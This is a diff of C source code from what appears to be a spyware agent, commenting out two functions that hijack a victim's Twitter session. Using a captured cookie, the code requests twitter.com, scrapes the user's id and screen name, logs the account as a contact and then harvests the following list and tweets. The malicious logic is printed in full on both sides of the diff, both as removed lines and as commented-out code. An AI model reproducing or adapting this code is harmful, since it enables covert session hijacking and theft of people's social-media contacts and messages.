@@ -234,71 +234,71 @@ DWORD ParseFollowing(char *user, char *cookie)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD HandleTwitterContacts(char *cookie)
-{
-	DWORD ret_val;
-	BYTE *r_buffer = NULL;
-	DWORD response_len;
-	char *parser1, *parser2;
-	char user[256];
-	WCHAR user_name[256];
-	static BOOL scanned = FALSE;
-	HANDLE hfile;
-
-
-	if (!bPM_ContactsStarted)
-		return SOCIAL_REQUEST_NETWORK_PROBLEM;
-
-	if (scanned)
-		return SOCIAL_REQUEST_SUCCESS;
-
-	// Identifica l'utente
-	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
-	if (ret_val != SOCIAL_REQUEST_SUCCESS)
-		return ret_val;
-
-	parser1 = (char *)r_buffer;
-	LOOP {
-		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
-		if (!parser1) {
-			SAFE_FREE(r_buffer);
-			return SOCIAL_REQUEST_BAD_COOKIE;
-		}
-		parser1 += strlen("data-user-id=\"");
-		parser2 = (char *)strchr((char *)parser1, '\"');
-		if (!parser2) {
-			SAFE_FREE(r_buffer);
-			return SOCIAL_REQUEST_BAD_COOKIE;
-		}
-		*parser2=0;
-		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
-		if (strlen(user)) 
-			break;
-		parser1 = parser2 + 1;
-	}
-
-	// Cattura il proprio account
-	parser1 = parser2 + 1;
-	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
-	if (parser1) {
-		parser1 += strlen("data-screen-name=\"");
-		parser2 = (char *)strchr((char *)parser1, '\"');
-		if (parser2) {
-			*parser2=0;
-			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
-			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);		
-			DumpContact(hfile, CONTACT_SRC_TWITTER, user_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, user_name, NULL, CONTACTS_MYACCOUNT);
-			Log_CloseFile(hfile);
-		}
-	}
-	
-	SAFE_FREE(r_buffer);
-	scanned = TRUE;
-
-	//ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
-	//return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
-	return ParseFollowing(user, cookie);
-}
+// DWORD HandleTwitterContacts(char **cookie)
+// {
+// 	DWORD ret_val;
+// 	BYTE *r_buffer = NULL;
+// 	DWORD response_len;
+// 	char *parser1, *parser2;
+// 	char user[256];
+// 	WCHAR user_name[256];
+// 	static BOOL scanned = FALSE;
+// 	HANDLE hfile;
+// 
+// 
+// 	if (!bPM_ContactsStarted)
+// 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+// 
+// 	if (scanned)
+// 		return SOCIAL_REQUEST_SUCCESS;
+// 
+// 	// Identifica l'utente
+// 	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
+// 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+// 		return ret_val;
+// 
+// 	parser1 = (char *)r_buffer;
+// 	LOOP {
+// 		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
+// 		if (!parser1) {
+// 			SAFE_FREE(r_buffer);
+// 			return SOCIAL_REQUEST_BAD_COOKIE;
+// 		}
+// 		parser1 += strlen("data-user-id=\"");
+// 		parser2 = (char *)strchr((char *)parser1, '\"');
+// 		if (!parser2) {
+// 			SAFE_FREE(r_buffer);
+// 			return SOCIAL_REQUEST_BAD_COOKIE;
+// 		}
+// 		*parser2=0;
+// 		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+// 		if (strlen(user)) 
+// 			break;
+// 		parser1 = parser2 + 1;
+// 	}
+// 
+// 	// Cattura il proprio account
+// 	parser1 = parser2 + 1;
+// 	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
+// 	if (parser1) {
+// 		parser1 += strlen("data-screen-name=\"");
+// 		parser2 = (char *)strchr((char *)parser1, '\"');
+// 		if (parser2) {
+// 			*parser2=0;
+// 			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+// 			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);		
+// 			DumpContact(hfile, CONTACT_SRC_TWITTER, user_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, user_name, NULL, CONTACTS_MYACCOUNT);
+// 			Log_CloseFile(hfile);
+// 		}
+// 	}
+// 	
+// 	SAFE_FREE(r_buffer);
+// 	scanned = TRUE;
+// 
+// 	//ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
+// 	//return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
+// 	return ParseFollowing(user, cookie);
+// }
 
 #define TW_TWEET_BODY "\"text\":\""
 #define TW_TWEET_ID "\"id_str\":\""
@@ -553,43 +553,43 @@ DWORD ParseTweet(char *user, char *cookie)
 //	return SOCIAL_REQUEST_SUCCESS;
 //}
 
-DWORD HandleTwitterTweets(char *cookie)
-{
-	DWORD ret_val;
-	BYTE *r_buffer = NULL;
-	DWORD response_len;
-	char *parser1, *parser2;
-	char user[256];
-
-
-	if (!bPM_IMStarted)
-		return SOCIAL_REQUEST_NETWORK_PROBLEM;
-
-	// Identifica l'utente
-	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
-	if (ret_val != SOCIAL_REQUEST_SUCCESS)
-		return ret_val;
-
-	parser1 = (char *)r_buffer;
-	LOOP {
-		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
-		if (!parser1) {
-			SAFE_FREE(r_buffer);
-			return SOCIAL_REQUEST_BAD_COOKIE;
-		}
-		parser1 += strlen("data-user-id=\"");
-		parser2 = (char *)strchr((char *)parser1, '\"');
-		if (!parser2) {
-			SAFE_FREE(r_buffer);
-			return SOCIAL_REQUEST_BAD_COOKIE;
-		}
-		*parser2=0;
-		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
-		if (strlen(user)) 
-			break;
-		parser1 = parser2 + 1;
-	}
-
-	SAFE_FREE(r_buffer);
-	return ParseTweet(user, cookie);
-}
+// DWORD HandleTwitterTweets(char **cookie)
+// {
+// 	DWORD ret_val;
+// 	BYTE *r_buffer = NULL;
+// 	DWORD response_len;
+// 	char *parser1, *parser2;
+// 	char user[256];
+// 
+// 
+// 	if (!bPM_IMStarted)
+// 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+// 
+// 	// Identifica l'utente
+// 	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
+// 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+// 		return ret_val;
+// 
+// 	parser1 = (char *)r_buffer;
+// 	LOOP {
+// 		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
+// 		if (!parser1) {
+// 			SAFE_FREE(r_buffer);
+// 			return SOCIAL_REQUEST_BAD_COOKIE;
+// 		}
+// 		parser1 += strlen("data-user-id=\"");
+// 		parser2 = (char *)strchr((char *)parser1, '\"');
+// 		if (!parser2) {
+// 			SAFE_FREE(r_buffer);
+// 			return SOCIAL_REQUEST_BAD_COOKIE;
+// 		}
+// 		*parser2=0;
+// 		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+// 		if (strlen(user)) 
+// 			break;
+// 		parser1 = parser2 + 1;
+// 	}
+// 
+// 	SAFE_FREE(r_buffer);
+// 	return ParseTweet(user, cookie);
+// }
